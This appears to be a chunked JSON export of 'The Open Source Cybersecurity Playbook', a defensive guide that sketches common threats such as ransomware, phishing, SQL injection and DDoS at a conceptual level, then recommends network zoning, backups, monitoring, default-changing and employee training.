      "doc_id": "Playbook",
      "chunk_id": 0
    }
  },
  {
    "text": "What it is: There are two ways to steal anything — you either take it yourself or you get someone else to give it to you. Social engineering is a broad umbrella term for any tactics designed to exploit and manipulate trust, so the victim hands the attacker what they want — access to information, accounts, or computers inside a secured area. Think fake customer service calls designed to reset passwords or a criminal spoofing your CEO’s email address and asking someone in finance to send an urgent wire transfer — a type of scam referred to as a business email compromise (BEC). What makes protection a challenge: Everyone — repeat, everyone — can be conned, defrauded, fooled, or manipulated. Being vulnerable can sometimes come down to a lack of training or experience, but more often it can simply come down to distraction and mental fatigue. Since this attack targets people directly there’s very little that technical safeguards can do, especially if the action isn’t outside the employee’s typical responsibilities or usual behavior — like resetting a password for a desperate user (a typical tech support con). THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 5 Ransomware What it is: Malicious software designed to encrypt a victim’s files and then demand payment, generally in anonymous Bitcoin, in exchange for decrypting the files. As with other malware infections, ransomware attacks typically start with employees falling victim to phishing emails or visiting compromised websites. Unlike other malware infections, however, the primary goal of ransomware isn’t to gain stealth and persistence for long periods of time. Instead, its priority is to spread as quickly as possible, encrypt as much data as possible, then actively alert victims of its presence so criminals can extort them. What makes protection a challenge: Ransomware will lock up any drive the employee has access to, including connected USB drives and network shares. Once files are encrypted the only way to regain access to them is to a) hope you have a reliable, up-to-date backup; b) hope a security researcher has cracked the encryption and made a decrypting tool available; or c) hold your nose and pay the ransom. Paying up is anything but a sure thing, because, well, ransomware authors are criminals. Being dishonest is what they do. They’re also occasionally less than spectacular at coding, so there’s also the risk of paying the ransom only to find your files were accidentally destroyed or rendered unrecoverable. One reason ransomware is hard to protect against is because it’s built to turn a strength — making files accessible across an organization — into a weakness. Additionally, with ransomware developing into a billion-dollar industry, there’s plenty of incentive for criminals to continue investing in delivery and evasion tactics to keep their business model humming. That means they can change faster than your signature-based security solutions can keep up. Downloaders What it is: Normal-looking programs designed to fetch and install malware without raising any security alarms. In effect, what downloaders allow attackers",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 1
    }
  },
  {
    "text": "continue investing in delivery and evasion tactics to keep their business model humming. That means they can change faster than your signature-based security solutions can keep up. Downloaders What it is: Normal-looking programs designed to fetch and install malware without raising any security alarms. In effect, what downloaders allow attackers to do is to get a “man on the inside” prior to committing to a full attack (it’s no coincidence they’re typically called “trojan programs”). Once a downloader creeps its way onto a victim’s system it can scope out the security settings, then smuggle other dangerous malware in after it’s established the cost is clear. Even after an attack is discovered and the other malware has been removed, as long as the downloader is still there hiding away, it can grab more malware and start the process all over again. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 6 What makes protection a challenge: Downloaders are one step removed from the actual dirty work involved in executing an attack. That means they don’t have to pack the same kind of functionality that might get other malware blocked. Instead, malware makers can focus solely on designing downloaders to be extremely good at avoiding detection. Think of it as attackers choosing to have a team made up skilled specialists rather than mediocre generalists. The downloader is a prolific passer and the malware it downloads is a sensational scorer. With both of them able to focus on their respective speciality, they’re able to be much more effective when paired together. Drive-by Downloads / Download Hijacking What it is: In nature, the big predators hang out at common water holes and wait for their prey to come by. On the Internet, the big predators find ways to turn popular website visits into covert attacks. In some cases, they inject code through comments that force unsuspecting visitors to automatically download malware. In other cases, they compromise the web server and inject malicious code into seemingly legitimate downloads. Another trick is to utilize exploit kits, programs designed to actively probe the website visitor’s system for software vulnerabilities that can be exploited. What makes protection a challenge: Not only do attackers have the element of surprise in these situations, they also have a collection of tricks to make sure they’re successful. If you update your browser, they’ll update their code. If you patch a vulnerability they’ll move on to a new one. It’s also not as if we’re talking about strictly sketchy websites. Some of the web’s most popular sites (The New York Times, the BBC, AOL, the MSN homepage) have been compromised in the past. You usually can’t ask employees to stop using the Internet altogether. Malvertising What it is: Marketers aren’t the only ones who like to utilize advertising to get in front of the crowds of website visitors. Criminals do the same thing, creating fake ads or inserting malicious code into legitimate ads so they can quite literally capture their audience. What makes protection",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 2
    }
  },
  {
    "text": "Malvertising What it is: Marketers aren’t the only ones who like to utilize advertising to get in front of the crowds of website visitors. Criminals do the same thing, creating fake ads or inserting malicious code into legitimate ads so they can quite literally capture their audience. What makes protection a challenge: Online advertising is already incredibly prevalent and chances are it’s only going to grow more aggressive. At the same time, people are also becoming increasingly used to ads, including pop-ups, etc. and they’re no longer viewed with as much mistrust. In terms of protection, the quick knee-jerk reaction is to use ad-blocker software. Unfortunately, many websites don’t work unless you deactivate it. And if employees have to choose between their ad-blocker and a top 10 list of cat videos... THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 7 Zero-Day Attack What it is: Traditionally, a zero-day refers to any undisclosed vulnerability that attackers can exploit before victims and software vendors become aware of it and have the chance to patch it. The term “zero-day attack” is also sometimes more broadly applied to attacks that utilize new tactics, exploits, or malware variants that haven’t been seen before, giving them an advantage. What makes protection a challenge: It’s difficult to protect yourself against something you’ve never encountered before, especially if it blindsides you. Signature-based security solutions are particularly susceptible to getting bypassed by zero-day attacks since the way they identify malicious files is by comparing them to a list of previously captured malware samples to see if there’s a match. If an attack is using a never-before-seen exploit or piece of malware, there’s a good chance it’s going to claim a victim. Because of their effectiveness, zero-days are in high demand, and criminals have become increasingly incentivized to discover more of them. Unfortunately, that means uncovering and patching one vulnerability may only offer you momentary protection before attackers move on to exploiting the next one. Password Cracking What it is: A login and password isn’t what most people think it is. It’s actually a complicated set of processes that can involve multiple systems, secure transport to and from the servers, a trusted network of server identity assurance and revocation, code to evaluate the complexity of the user-generated password, more code to make sure the person entering the code is indeed a human, a secondary factor of authentication, and a means to recover lost passwords. So password cracking is more than just running a program to guess the password — it’s about cracking the password process to take over a user’s account. What makes protection a challenge: Any system that allows users to access it from anywhere and also requires those users to make, safeguard, and remember their own passwords is a system that’s going to be difficult (if not impossible) to defend. According to what OSSTMM researchers refer to as “The Somebody Sequence,” the more interaction somebody has in the security process, the greater its attack surface. Asking employees to",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 3
    }
  },
  {
    "text": "users to make, safeguard, and remember their own passwords is a system that’s going to be difficult (if not impossible) to defend. According to what OSSTMM researchers refer to as “The Somebody Sequence,” the more interaction somebody has in the security process, the greater its attack surface. Asking employees to manage their own passwords is like giving them full control over the keys to an important lock. You can purchase one of the strongest locks money can buy, but how secure can it ultimately be if there are keys for it floating around everywhere? THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 8 Distributed Denial of Service Attack (DDoS) What it is: There is only so much traffic a computer system can process before it starts to slow down and becomes overwhelmed. By gaining control over a large number of hijacked systems and devices (referred to as a botnet), attackers can direct large amounts of connection requests or packets of random data at a single target all at once, with the intention of overloading the system and taking it offline. What makes protection a challenge: The larger the botnet, the more damage a DDoS attack can do. The best you can hope for when you’re attacked is that you’re subscribed to an anti-DDoS service, but even that doesn’t provide a guarantee you’ll stay up and running if you’re dealing with an attack with a high level of magnitude. To make matters worse, sometimes attackers will contact their targets ahead of time and threaten to knock them offline unless “protection money” is paid up front. It can be difficult to discern whether such threats or simply scams, and — as is the case with ransomware — giving in to criminal extortion demands never comes with a guarantee. Scareware What it is: You’ve probably seen the pop-ups — “Warning! A virus has been detected on your computer. Download VirusBlaster to clean and remove it.” The malware that really infects your computer is the program that pop-up is trying to trick you into downloading. Scareware can come in a variety of forms from fake antivirus programs to fake browsers or software updates. What makes protection a challenge: We know that social engineering works because it preys on the distracted and mentally fatigued. Combine that with eagerness to please or help and thus begins the “good intentions” downward spiral that leads employees to make really bad decisions. Once scareware gets inside the system it has all the privileges, passwords, and logins of the employee who installed it. Getting it out may be as easy as just wiping the system and starting fresh or recovering from backup. Or it may be more difficult and time- consuming if the malware spreads to other systems. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 9 SQL Injection What it is: If a website has an input box or entry form (like when you’re entering in your username and password, or your credit card number if you’re buying something)",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 4
    }
  },
  {
    "text": "consuming if the malware spreads to other systems. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 1: SCOUTING REPORTS 9 SQL Injection What it is: If a website has an input box or entry form (like when you’re entering in your username and password, or your credit card number if you’re buying something) then an attacker can try inserting structured query language code to gain access to or make changes to the stored data. What makes protection a challenge: SQL injection exploits a trust between the web application and its database to let the attacker do pretty much whatever it wants with the database. If all you can think of is “delete data” then you’re underestimating the depths a criminal can stoop to. Besides adding, removing, and changing data, and in addition to stealing info like client credit card numbers, personal data, and health records, there’s also the possibility of inserting malicious code to be passed back to users when they use the form, instead of the data they’re looking for. Once criminals start using that tactic they can abuse popular websites to do their dirty work for them like distributing drive-by downloads, building a botnet army, even hijacking DNS requests to send visitors to malicious versions of legitimate websites they know and trust. If the login form is vulnerable, SQL injection can even help with password cracking by the bypassing the login altogether. Any place where a user can input information into a website with a database, it has the potential to be SQL injectable, which unfortunately makes it a widespread problem. You can’t just remove all user-input interactions from your website and still get any purchases or feedback. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPart 2: The Game Plan As anyone who’s ever been on the wrong side of a data breach can attest, security is not a game. First of all, the stakes are real. But also unlike a game, there are no set rules or boundaries. Even if there were, attackers aren’t exactly known for their fair play. That said, we do tend to discuss security using sports terms. There is an offense with attackers and there is defense. The goal of the defenders is to stop the attackers, to prevent them from accessing or causing damage to our assets. This is done through defensive tactics just like the attackers apply offensive tactics. The biggest problem is we don’t always know the parameters of the “game” we’re playing with attackers until it’s too late. We don’t know who our opponents are. We don’t know their capabilities or their goals. Is it stealthy, silent robbery or a quick smash and grab for data they can quickly encrypt and ransom? Are we their target of hate or are we a moment of opportunity for them? As a result, we’re pressured to develop tactics that can somehow be equally effective against a diverse and rapidly growing variety of potential attacks. Worse, our defenses also have to take into account the operational needs of the",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 5
    }
  },
  {
    "text": "target of hate or are we a moment of opportunity for them? As a result, we’re pressured to develop tactics that can somehow be equally effective against a diverse and rapidly growing variety of potential attacks. Worse, our defenses also have to take into account the operational needs of the business. Not only do we need to stop attacks, we also need to ensure our security measures don’t also slow or stop any processes or services. An attacker has no such limitations. As such, the first thing any game plan for our security efforts has to take into account is that attackers and defenders aren’t playing by the same rules. The playing field is anything but level. An attacker only has to be effective against one specific aspect of our defense — by any means possible — in order to be successful. As a defender, meanwhile, we have to be effective against all manner of potential attacks. And we have to operate under economical limitations, legal restrictions, and industry regulations. With the game so stacked against us, what does a winning strategy for defenders look like? THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 11 Create a Zone Defense You can’t go one-on-one with an opponent you can’t see coming. To counter an attacker’s advantages in terms of flexibility and surprise, you need to develop a zone defense. In sports, a zone is a means of separating the field into areas of focused defense. The idea is that by creating separation, you can ensure that a threat either cannot physically reach an asset or that it encounters an increased defense when it does. Establishing separation is at the heart of any effective defensive strategy, and the first step toward assuring security. To achieve it, build your game plan around the following: 1. Create zones by logically and physically separating services and assets from each other. Ex: Assets of one department should only be accessible to that department or group. All system accesses should be directly whitelisted (limited to a list of predetermined authorized types) through a switch and a firewall. 2. Create zones across your remote (vendor or cloud) accounts by using a separate login and secret sentence for each. Re-using passwords across vendors is the fastest and easiest way to get accounts compromised. Personal certificates and private key cryptography are much stronger than even secret sentences and should be used for administrative (root) access to external services. However, be sure to protect even those keys and certificates with a “secret sentence” — a password that is a complete sentence with capitalization and punctuation that means something to you so you’ll remember it. For example, a secret sentence for Facebook might be, I just wasted 2 hours on Facebook! For your VoIP provider, it might be, Boss says, “No more big bills.” complete with all the punctuation. 3. Create trust zones in the network where no system is directly accessible to another system. Ex: Desktops should not be able",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 6
    }
  },
  {
    "text": "Facebook might be, I just wasted 2 hours on Facebook! For your VoIP provider, it might be, Boss says, “No more big bills.” complete with all the punctuation. 3. Create trust zones in the network where no system is directly accessible to another system. Ex: Desktops should not be able to connect to other desktops and network shares should be closed. Even if it’s on the same network, no system should be able to reach another system unless you planned for it to. Have all desktops connect to a fileserver to store documents. Make sure all administrative access ports like SSH on servers or administrative web access on intranet servers are only be reachable by the administrator’s system or, even better, manually on that server’s keyboard if it’s a local server. This is the network-level version of least privilege where only those who should access a particular document, printer, file server, or resource should be allowed to. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 12 4. Create system zones in addition to people zones. When you make zones of who can access what you are giving authorization to specific people and what they can do with their system. However, there is an inherent weakness in this type of zone: trust. Many types of attacks, like phishing attacks, use the trusts of a particular user to gain access to other systems without the user having any idea it’s happening. You want to make sure that any resource accessed is done so by the person authorized to do so, and not secretly from their compromised system. One of the most common technologies to help you do this is CAPTCHA, which makes you prove you’re human. In addition, it will reduce web comment SPAN and brute-force attacks (exhaustive attempts to guess passwords) on authentication systems. 5. Avoid all-in-one networked systems. Examples are network access storage (NAS) + printer, or router + wi-fi. These systems are inherently weaker because they are more difficult to securely configure and more difficult to zone by filtering who is authorized to use them. If your router has wi-fi built in, disable it and instead use a wi-fi router in a special zone which cannot connect to internal systems. 6. Maintain a rigorous patching schedule for systems that are connected directly to the Internet. While racing to patch should not be a primary defense, for Internet-facing services it’s one of the few ways you can protect a server. For non-Internet-facing systems, you will want to make patching and other updates part of a regular maintenance schedule rather than automatically implementing them all the time. This will give you time to test the patches and updates on the standard system first, as well as create a routine in your network traffic that will help you identify malicious installs. 7. Create zones in your desktops, servers, and mobile devices that separate what can execute and what can read/write. This allows for temp files to be created while denying temp",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 7
    }
  },
  {
    "text": "standard system first, as well as create a routine in your network traffic that will help you identify malicious installs. 7. Create zones in your desktops, servers, and mobile devices that separate what can execute and what can read/write. This allows for temp files to be created while denying temp files from executing in the case of malware. On desktops and mobile devices, whitelist specifically which applications may execute or use the network and deny the rest. Furthermore, exercise the principle of least privilege to ensure users don’t get administrative or elevated privileges by default. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 13 8. Keep work and personal mobile devices separate. Apps have notoriously bad security, and each app on your mobile device is connected to every other app on that device. That makes the concept of zoning incredibly important. If your business requires the use of mobile devices then separate which can have personal apps and which can have work apps. There is technology to separate work and personal data on one physical device if you don’t want to carry two devices. 9. Create zones by using multiple web browsers to deal with web attacks. For example, you can keep one browser clean with no plug-ins and use it specifically for banking, vendor administration, and other critically confidential connections. Use another browser for online shopping. Use another browser for reading the news, surfing, and social networks (note: Do use ad blockers and privacy plug-ins on the browser for surfing to minimize exposure to malicious ads that force downloads of malware). You can also use a single browser with multiple profiles, however some browsers require a particular profile to be closed while another is open, and that can be a hassle. 10. Zone your remote interactions. That means any remote access to your office, interactions with cloud services, administrating vendor accounts over the web, or sending emails. Your best protection for remote interactions is encryption. Use an encrypted VPN if the place you’re sending or receiving from is not your place of work. Because emails are plain text and can be read along the route from one place to another you should use email encryption anytime you’re emailing between remote offices or sending sensitive information. 11. Use work times as part of your zoning. Shut down systems, routers, and wi-fi access points you don’t need to keep running at the end of the day, weekends, and holidays. If you can’t have staff support incident response for these things and be there to deal with emergencies then they should not be connected to the Internet during those times. 12. Use blacklists if you can’t whitelist or as an addition to whitelisting. A blacklist is a list of everything not allowed to enter or connect to a particular system. A whitelist, on the other hand, is a list of the things you allow. By using blacklists, you can deny entire categories of devices, programs, or service types if they aren’t",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 8
    }
  },
  {
    "text": "to whitelisting. A blacklist is a list of everything not allowed to enter or connect to a particular system. A whitelist, on the other hand, is a list of the things you allow. By using blacklists, you can deny entire categories of devices, programs, or service types if they aren’t needed. Despite being weaker and easier to bypass than whitelists, blacklists are much easier to implement and maintain. This makes them practical as an additional form of separation. For example, most antivirus software utilizes a blacklist that enumerates known bad malware to search for in downloads and installs. SPAM controls work mostly with blacklists. Most firewalls and routers can employ blacklists to deny access from countries where they don’t do business. Specialized threat blacklists can also block known sites serving malware and launching attacks. Any of these can be employed as additional protection. Just keep in mind they can be shockingly easy for attackers to circumvent and therefore they should never be the main form of separation. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 14 Apply Rehabilitation Tactics As is frequently the case in sports, outcomes in security are often determined by conditioning that took place far in advance. Athletes don’t show up to game day without putting in countless hours of practice first, and sporting franchises don’t invest in star athletes without first ensuring they have the trainers, doctors, and coaches necessary to support them and keep them performing at their best. Ask yourself: How rigorously has your security been tested? How many scenarios have you’ve prepared for? How quickly can you recover from setbacks and attacks? Security is equal parts preparation and resiliency. To achieve that, you need to adjust your game plan so it includes regularly revisiting steps for what to do when something goes wrong. Here are some rehabilitation tactics you should be sure to use: 1. Set up a means to back up and restore systems, data, mobile devices, and desktops. Backups should be centralized, secured, and ideally encrypted. If your backups are encrypted, both off-site (cloud) and internally stored back-ups are acceptable. Just remember, anything backed up outside your network is no longer in your control. Then again, if you cannot afford to properly build and test a backup system then you’re better off leaving control of such things to services that can. The key, however, is quick recovery, so test out restoring and make sure it happens quickly. 2. Have tools handy to fully copy a drive for forensics investigations and recovery. There are both hardware and software technologies that can do this, some of which are certified to use in criminal investigations. If you have cyber insurance for your network, you may be required to use specific forensic software to make a claim. 3. Keep shared data in central locations like a network access storage (NAS) server. That minimizes the amount of loss that occurs when a particular desktop fails. Standardized installs of desktops and daily-use devices along with nightly",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 9
    }
  },
  {
    "text": "you may be required to use specific forensic software to make a claim. 3. Keep shared data in central locations like a network access storage (NAS) server. That minimizes the amount of loss that occurs when a particular desktop fails. Standardized installs of desktops and daily-use devices along with nightly backups further shorten the time to full recovery. Being prepared for recovery will allow most compromised systems to be completely copied for forensics, wiped, and reinstalled to nearly full operation in under two hours. 4. Back up everything — even your centralized data. It’s the only way to assure a complete recovery. Set up all data services and file servers to be backed up and redundant with fall-back servers. This assures continuity and resilience so that server failure does not mean loss of service. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 15 5. Have emergency contact numbers for vendor support. If a forensics investigation uncovers why a particular attack was successful it may require immediate attention in the form of a patch, a configuration change, or both. 6. Consider investing in a distributed denial of service (DDoS) protection service. This can be especially important if your business relies on customers having timely access to an online presence such as an online store. There are many of these and it’s possible your hosting provider already offers this. However, you do need to make sure you know how much DDoS protection they can offer and perhaps invest in a vendor who specializes in it. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 16 Use Your Home Field Advantage The Internet is a hostile environment. That’s the reason we go to so much trouble to make sure our networks are able to interact but still remain separated from it. However more than just creating a safe environments for our users we need to take things one step further and also make them hostile environments for attackers. Creating an atmosphere and conditions that make it easy for you to thrive but difficult for your opponents — in sports this is what people refer to as home field advantage. Sometimes it can simply involve extra motivation and support from fans, but in some contexts there really are environmental factors involved. Some teams are better conditioned to perform on grass vs. synthetic fields. Others do better at high altitudes or in extreme heat or cold. In cybersecurity, there are three primary “home field advantages” you should be striving to leverage: visibility, protocol, and process. Do that and you can exploit the fact that, in order to do damage, attackers have to play the “away team” role. They have to come into your environment and contend with a network of systems you know better than anyone else. Here’s how to make the most of your home field advantages: 1. Know what’s happening on your network. This is probably your greatest home field advantage. To monitor your network for activity and have a clear picture",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 10
    }
  },
  {
    "text": "and contend with a network of systems you know better than anyone else. Here’s how to make the most of your home field advantages: 1. Know what’s happening on your network. This is probably your greatest home field advantage. To monitor your network for activity and have a clear picture of what’s running at any time of day there are several technologies you can look into. Security information and event management (SIEM) products will consolidate log files from all your systems and real-time captures of network traffic. Intrusion Detection Systems (IDS), which are generally a blacklist technology, will monitor real-time network traffic and respond to some types of attacks. Even without these technologies, however, tools like tcpdump and Wireshark will you give you more than enough information to understand what’s running on your network and where it’s going. That will help you at least see if your zone defense is working. As a network grows, you may want to look into behavioral analysis network tools to help automate sniffing out anomalies, because not all malicious activity is obvious. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 17 2. Know what should be on each default install of each hard drive, whether it’s a desktop or a server. This allows you to recognize malware or non-standard software installs. If you prefer to use file integrity software you will be alerted to changes in various files and directories that can indicate malware or compromise. Integrity checking is most powerful on servers where it can immediately replace files placed by attackers. 3. Change default settings. Your protocols are not just the types of packets that run on your network, but how you configure them to run. The attacker needs to learn what you’re running, how it’s connected to the rest of the network, and how it responds. By changing the default install and directory names, default logins and passwords on systems and devices, and default configurations such as the service ports of network devices and servers you can protect yourself from bot attacks which look for defaults. Simply moving the administrative port of SSH to a random, high number will keep it discreetly out of obvious reach while your network monitoring tools will notice a port scan and give you a chance to stop it. 4. Change how your servers respond to queries. Attackers who footprint your network for a targeted attack will primarily be looking for what kinds of systems and applications you have. Changing how your servers respond to queries so that there are only positives and false positives will flood common attack tools with noise so they cannot tell if the tool’s replies are true. For example, something as simple as changing your web servers to respond to every request with a 200 even if it’s not found or moved (error codes 404 and 302, respectively) can render common, automated web scraping and analysis tools mostly useless. You can tune your TCP responses also so every port queried responds",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 11
    }
  },
  {
    "text": "simple as changing your web servers to respond to every request with a 200 even if it’s not found or moved (error codes 404 and 302, respectively) can render common, automated web scraping and analysis tools mostly useless. You can tune your TCP responses also so every port queried responds to every SYN with an ACK. This is often most easily done with a port-forwarding firewall responding for the server, whether a server exists for that IP address or not. That technique makes a TCP port scan worthless. Of course, this will not stop an advanced attacker with access to better tools, but that’s what your zone defense is for. Changing your defaults is how you make the pool of possibly successful attackers much smaller. 5. Know what normal looks like. The way you do that is by knowing and understanding your employees, your vendors, your routines, your operating hours, and your policies. For example, if you know that no Microsoft Security center should be calling you to allow them to remotely inspect your system for malicious activity because you never paid for such a service then you’ll recognize it as a social engineering or phishing attack and will be prepared to stop it quickly. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 18 6. Make your users part of the solution. By making sure all your employees are aware of what’s normal, you can prevent a majority or fraud and phishing attacks. Employees who are aware of routines will notice quickly when a customer sends an email rather then calls. Changes in routine are a good indicator of possible attacks and employees are the first line of defense by reporting their suspicions. Making it routine for employees to escalate and document changes in processes can help create a forensic trail. Later, this can be correlated with patterns on your network. You should also get in the habit of proactively talking to employees and asking how things are running. Complaints such as a noisy hard drive, a slow system, or strange messages can then be immediately investigated. If you are prepared to perform quick recoveries, a system that is acting suspicious can be quickly wiped and reinstalled. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPart 3: Looking Downfield Despite the sports analogy, let’s be clear, cybersecurity isn’t something you dabble in. There’s no bush league cybersecurity. It’s not a game. Losers are real victims who incur real and sometimes catastrophic losses. Even winning is just a fleeting moment that is gone as quickly as it came. Cybersecurity is hard because we don’t know all of the possible vulnerabilities we have or all of the possible threats there may be. Even if we could, they change too frequently for us to maintain specific defenses. That’s because the environment we work in is changing all the time. New technologies, new business models, new services, and new communication channels make it extremely difficult to secure it all. Furthermore, this competition against attackers will last indefinitely.",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 12
    }
  },
  {
    "text": "could, they change too frequently for us to maintain specific defenses. That’s because the environment we work in is changing all the time. New technologies, new business models, new services, and new communication channels make it extremely difficult to secure it all. Furthermore, this competition against attackers will last indefinitely. That means your overall strategy has to be winning not just this season but every season after that. To do that you need to keep your players in shape, steadily improve your equipment, maintain a healthy environment, and employ the right tactics to stay in the game. In this section, we’ll cover how. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 20 Training All employees need to understand how cybersecurity affects their personal day-to-day role in the company, and they need to be trained in situational awareness both on and off the computer. \u0001 Teach all employees how they can be manipulated and fooled both in person and online. \u0001 There’s an infinite number of variations that an attack can take but a finite number of ways a person is vulnerable to fraud and manipulation. Rather than expect employees to be able to identify all manner of constantly shifting threats, instead teach them how to react securely when one of their vulnerabilities is probed (ex: when they’re asked for sensitive information). \u0001 Make it easy for employees to talk about their security or privacy concerns. \u0001 Employees are a company’s best anomaly detection engine. Make sure they will be able to voice their doubts and unusual activity before those concerns grow into big problems. \u0001 Really know your systems. \u0001 Anyone working in IT or cybersecurity should be well versed in how all of the current software and systems work inside the organization. It’s not enough to be certified or experienced in the brand of technology. You have to know how it works in your organization. You can’t secure anything if you don’t know what it does and how it works in your environment. Bring in a coach that will teach you and others security in the context of your operations. \u0001 Understand how to apply the basics. \u0001 All cybersecurity personnel should be well versed in operational security fundamentals as outlined in the OSSTMM which they can apply anywhere from physical to cyber anything. It’s not enough for them to say they read it, have them map your business processes into its controls and limitations as shown in the OSSTMM to see exactly how big your attack surface is. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 21 Exercises Knowing how to swim doesn’t mean anything when the tsunami hits. To stay above hostile waters you need to train regularly on how to react when things go wrong. Only with exercises can you assure that despite fear, confusion, or fatigue, the default reaction is the secure one. \u0001 Create an incident response plan and drill it. \u0001 Create an emergency checklist employees can use and keep practicing walking through",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 13
    }
  },
  {
    "text": "regularly on how to react when things go wrong. Only with exercises can you assure that despite fear, confusion, or fatigue, the default reaction is the secure one. \u0001 Create an incident response plan and drill it. \u0001 Create an emergency checklist employees can use and keep practicing walking through it until everyone is clear on how they should react. Include all new hires in the drills from their first day. \u0001 Get employees used to dealing with attacks. \u0001 Plan regular security exercises designed to manipulate employees such as mock phishing attacks, social engineering in person and on the phone, and fake malware activity. \u0001 Give mandatory security challenges and puzzles. \u0001 These should take no more than a couple minutes to complete and are designed to be done without taking employees completely out of their day-to-day tasks. This trains employees to think security while doing their normal activities since nobody has the luxury to stop working during real attacks. Equipment In many sports, being the better athlete doesn’t guarantee a win on its own. The difference between first and second place can often come down to the equipment. New materials, new technology, and new designs can give you a critical advantage. \u0001 Make the most of your tech. \u0001 In cybersecurity, having better routers increases response times, better processors allow for stronger encryption protocols, and more elastic monitoring solutions reduce the need to spread out resources. \u0001 Consider the cloud. \u0001 Cloud-based services can provide you with additional functionality you don’t have to build or manage on your own. There’s a trade-off in terms of control and self-sufficiency, of course, but the added capabilities can allow you to do more with less. \u0001 Even when you can’t allocate resources on new equipment, you need to maintain the old. \u0001 Sometimes just upgrading components like RAM and hard disks is enough to make a difference. \u0001 Keep your systems running lean. \u0001 Stick to necessary software as much as possible, minimizing the memory resident and memory-hungry software that can slowly grind a system to a halt. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 22 Environment Some athletes compete on clay, some on dirt, some on grass, and others on artificial surfaces like artificial turf or asphalt. What they all have in common is that they’ve honed their game to adapt to that environment and they’ve cultivated a home field advantage by learning how to outcompete others on it accordingly. You need to do the same by getting to know your own environment by actively maintaining it and understanding even the littlest changes. \u0001 Know what “normal” looks like. \u0001 Make a routine of examining the protocols on the network, the systems that interact with each other, the ways the employees use their desktops, and how mobile devices operate in this environment. Fire up a packet sniffer and watch live traffic in different segments. Make sure you know what it all is and whether it should even be there.",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 14
    }
  },
  {
    "text": "network, the systems that interact with each other, the ways the employees use their desktops, and how mobile devices operate in this environment. Fire up a packet sniffer and watch live traffic in different segments. Make sure you know what it all is and whether it should even be there. If you can get a professional tool for constantly monitoring traffic, like a SIEM, even better. Then track down those anomalies. \u0001 Remember: Not all software needs to be updated. \u0001 You should always update if a security patch is necessary and you have no other means of controlling the vulnerability. However, that requires you have the people and time to investigate that. If the updates are for new functionality only, on the other hand, consider whether you really need this new functionality. Many a process has been broken and many a file has been lost because an application or system update made changes you didn’t need or anticipate. As any coach will tell you, if it’s not broken, don’t fix it. So have a process in place to pick and choose which updates get installed. \u0001 Make rounds and talk to employees. \u0001 Get to know what they need to do their jobs, how they interact with third party vendor services, and what software they use regularly. People develop routines and habits at work. They are your best source for knowing when something outside your basic control like cloud services and vendor extranets are not behaving like normal. Forget Strategy, Choose Your Tactics A strategy is an integral part of any modern business plan. So what exactly is a cybersecurity strategy? A cybersecurity strategy is a plan with a set of goals and objectives to achieve cybersecurity as a result. People who are into selling cybersecurity strategies like to say it also includes specifics on tools and metrics. But that’s really just a trick of adding tactics to the strategy so it doesn’t sound so useless. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 23 Yes, useless. Fun fact for you — a cybersecurity strategy is useless. The truth is if you don’t have one for your business it’s because you’ve inherently got one already. You’ve never bothered to formally document it because it’s so obvious. Like how you don’t have a formal not dying strategy. If you were to have a formal cybersecurity strategy it would likely say you don’t want threats of any sort affecting your assets of any sort now or in the future. Which is obvious. So if it’s useless, why is there such a focus on a cybersecurity strategy? Because tactics are hard. It’s easier (and safer) to make a cybersecurity strategy sound like something important despite meaning nothing than it is to choose and implement tactics that work. You look better longer, too, because whereas a cybersecurity strategy can go on meaning nothing a really long time tactics that mean nothing get noticed right away. Cybersecurity tactics, meanwhile, are where the rubber meets",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 15
    }
  },
  {
